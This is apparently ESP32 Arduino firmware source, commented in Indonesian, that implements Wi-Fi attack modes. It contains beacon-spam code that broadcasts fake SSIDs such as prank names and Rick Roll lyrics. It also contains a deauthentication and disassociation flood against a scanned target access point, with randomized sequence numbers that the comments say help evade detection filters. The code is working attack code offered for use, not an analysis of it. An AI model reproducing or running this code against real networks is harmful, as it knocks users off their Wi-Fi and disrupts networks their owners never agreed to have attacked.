#include <Arduino.h>
#include <globals.h>




// Fungsi sakti buat ubah String MAC ke Bytes
void stringToMac(String macStr, uint8_t *macAddr) {
  int values[6];
  if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
    for (int i = 0; i < 6; ++i) macAddr[i] = (uint8_t)values[i];
  }
}


uint8_t beaconPacket[128] = {
    0x80, 0x00, // Frame Control: Beacon
    0x00, 0x00, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (Nanti di-random)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (Nanti di-random)
    0x00, 0x00, // Sequence Number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00, // Beacon Interval
    0x01, 0x04, // Capability Info
    0x00 // Tag Number: SSID
};

// List SSID buat ngerjain temen/orang (Bisa lu ganti sesuka hati)
const char* fakeSSIDs[] = {
    "Pencuri Data", "HP Anda Terhack", "RootX-Terminal", 
    "Beli Bakso Gratis", "Koneksi Lemot", "Polisi Siber", 
    "Minta Password?", "Pencari Janda"
};

const char* rickRollLyrics[] = {
  "1_Never gonna give you up",
  "2_Never gonna let you down",
  "3_Never gonna run around",
  "4_And desert you",
  "5_Never gonna make you cry",
  "6_Never gonna say goodbye",
  "7_Never gonna tell a lie",
  "8_And hurt you"
};


// --- TEMPLATE PAKET ALA GHOST-ESP ---
uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };

void loopWiFi(void * pvParameters) {
  for(;;) {
   if (isSpamming) {
   if (!spamUdahSetup) {
        esp_wifi_set_promiscuous(true);
        spamUdahSetup = true;
      }
   
      if (aktifModeSpam == 1) {
         // --- PELURU BEACON SPAM ---
         // Tembak paket beacon dengan SSID random
         
    
        int randomIdx = esp_random() % 8; 
        String currentSSID = fakeSSIDs[randomIdx];
        sendBeacon(currentSSID);
        // PENTING: Kasih jeda setelah keliling 13 channel biar Core 0 gak panic
        vTaskDelay(10 / portTICK_PERIOD_MS); 
      } 
      else if (aktifModeSpam == 2) {
         // --- PELURU RICKROLL ---
         // Tembak paket beacon dengan SSID "Never Gonna Give You Up"
         for (int i = 0; i < 8; i++) {
        String currentSSID = rickRollLyrics[i];
        sendBeacon(currentSSID); 
        vTaskDelay(5 / portTICK_PERIOD_MS); // Kasih napas dikit biar gak overload
    }
      }
      else if (aktifModeSpam == 3) {
         // --- PELURU BLE SPAM ---
         // (Khusus BLE nanti pake library NimBLE atau BLEDevice)
      }
      
      
      vTaskDelay(50 / portTICK_PERIOD_MS); // Biar gak crash
    } else if (triggerScan) {
      sedang_scan = true;
      
       adaTarget = false;        // Target lama dihapus
      targetLockedIdx = -1;     // Indeks kursor di-reset
      
      // Bersihin data lama dulu biar fresh
      totalWiFi = 0;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      vTaskDelay(100 / portTICK_PERIOD_MS);

      // Mulai Scan (Ini biasanya makan waktu 3-5 detik secara alami)
      int n = WiFi.scanNetworks();
      
      totalWiFi = (n > 30) ? 30 : n; // Maksimal 30 biar RAM lega
      for (int i = 0; i < totalWiFi; ++i) {
        listWiFi[i].id = i;
        listWiFi[i].ssid = WiFi.SSID(i);
        listWiFi[i].rssi = WiFi.RSSI(i);
        listWiFi[i].channel = WiFi.channel(i);
        listWiFi[i].mac = WiFi.BSSIDstr(i); // Ambil MAC target

      }
      
      sedang_scan = false;
      scanDone = true;     // Lapor ke Core 1 kalau udah beres
      triggerScan = false; // Matiin pelatuknya
    }
    
     
      
       
        
         
          
           
    // 1. PINDAH MODE KE AP (Biar lebih sakti kayak GhostESP)
      else if (isDeauthing && adaTarget) {
        if (!deauthUdahSetup) {
            esp_wifi_stop();
            // Rahasia 1: Set mode ke STA tapi jangan konek mana pun
            esp_wifi_set_mode(WIFI_MODE_STA); 
            esp_wifi_start();
            esp_wifi_set_promiscuous(true);
            
            // Rahasia 2: Matikan Power Save TOTAL (Wajib buat S3)
            esp_wifi_set_ps(WIFI_PS_NONE); 
            
            esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
            deauthUdahSetup = true;
        }

        uint8_t apMac[6];
        stringToMac(targetTerkunci.mac, apMac);
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        // RAHASIA 3: Pakai Burst Kecil tapi Frekuensi Tinggi
        for (int b = 0; b < 40; b++) {
            // Sequence Number harus ngacak total!
            uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
            
            // Build Packet manual di RAM (Biar gak kedetect static filter)
            uint8_t rawFrame[26];
            memcpy(rawFrame, deauthFrame, 26);
            
            rawFrame[0] = 0xc0; // Deauth
            memcpy(&rawFrame[4], broadcast, 6);
            memcpy(&rawFrame[10], apMac, 6);
            memcpy(&rawFrame[16], apMac, 6);
            rawFrame[22] = seq & 0xFF;
            rawFrame[23] = (seq >> 8) & 0xFF;
            rawFrame[24] = 0x01; // Reason code 1 (Unspecified)

            // INI TRIKNYA: Kirim lewat interface STA (WIFI_IF_STA) 
            // Kadang driver S3 lebih "longgar" di sini
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
            
            // Jika masih error 0xC0, kita ganti tipenya jadi Disassoc (0xA0)
            if (err != ESP_OK) {
                rawFrame[0] = 0xa0; 
                esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
            }
        }
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }

    if (!isSpamming) {
    esp_wifi_set_promiscuous(false);
     spamUdahSetup = false;
     } else if (!isDeauthing) {
     wifi_mode_t currentMode;
      esp_wifi_get_mode(&currentMode);

      // Kalau mode masih AP atau STA (berarti WiFi masih ON)
      if (currentMode != WIFI_MODE_NULL) { 
          esp_wifi_set_promiscuous(false); // Matiin mode intip
          esp_wifi_stop();                 // MATIIN TOTAL RADIO WIFI
          esp_wifi_deinit();
          esp_wifi_set_mode(WIFI_MODE_NULL); // Set mode ke Kosong
     deauthUdahSetup = false;
     }}
vTaskDelay(10 / portTICK_PERIOD_MS); 
}
}
void sendBeacon(String ssid) {
    int ssidLen = ssid.length();
    
    // 1. Acak MAC Address (Source & BSSID)
    for(int i=10; i<16; i++) {
        uint8_t r = esp_random() % 256;
        beaconPacket[i] = r;      
        beaconPacket[i+6] = r;    
    }

    // 2. Pasang Nama SSID ke Paket
    beaconPacket[37] = ssidLen;
    for(int i=0; i<ssidLen; i++) {
        beaconPacket[38+i] = ssid[i];
    }

    // 3. Tambah Tail (Akhiran Paket)
    uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
    memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));

    // 4. Tembak Keliling Channel
    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
        vTaskDelay(1); 
    }
}


    
